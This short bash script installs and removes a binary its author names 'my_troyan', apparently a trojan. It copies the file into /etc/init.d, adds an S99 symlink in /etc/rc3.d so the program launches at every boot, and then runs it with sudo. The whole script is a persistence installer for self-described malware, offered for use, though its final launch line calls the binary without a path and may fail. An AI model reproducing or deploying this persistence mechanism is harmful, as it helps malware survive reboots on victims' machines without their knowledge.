#!/bin/bash

BINARY="my_troyan"

install() {
  if [ ! -f "$BINARY" ]; then
    echo "$BINARY not exist"
    exit 1
  fi
  chmod 755 $BINARY
  sudo cp $BINARY /etc/init.d/

  sudo ln -sf "/etc/init.d/"$BINARY "/etc/rc3.d/S99"$BINARY
  if [ $(echo $?) != 0 ]; then
    echo "ERROR"
    exit 1
  fi
  echo "Install done"
  echo "Start application:"
  sudo $BINARY
}

remove() {
  sudo rm /etc/init.d/$BINARY
  sudo rm "/etc/rc3.d/S99"$BINARY
  echo "Remove done"
}

case "$1" in
install)
  install
  ;;
remove)
  remove
  ;;
*)
  echo "Usage: $0 {install|remove}"
  ;;
esac
